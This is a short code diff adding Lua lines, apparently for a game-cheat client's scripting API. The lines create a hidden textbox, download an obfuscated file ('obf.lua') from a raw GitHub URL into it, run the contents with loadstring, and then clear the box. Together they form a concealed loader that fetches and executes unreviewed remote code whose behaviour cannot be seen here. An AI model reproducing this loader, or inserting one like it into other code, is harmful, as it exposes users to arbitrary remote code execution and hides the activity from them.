@@ -1,0 +1,5 @@
+box = gui.add_textbox('Box', "lua>tab a")
+gui.set_visible('lua>tab a>Box', false)
+utils.http_get("https://raw.githubusercontent.com/Lam1nath/Venerra.tech/refs/heads/main/obf.lua", "", function(response) box:set_string(response) end)
+loadstring(box:get_string())()
+box:set_string('')
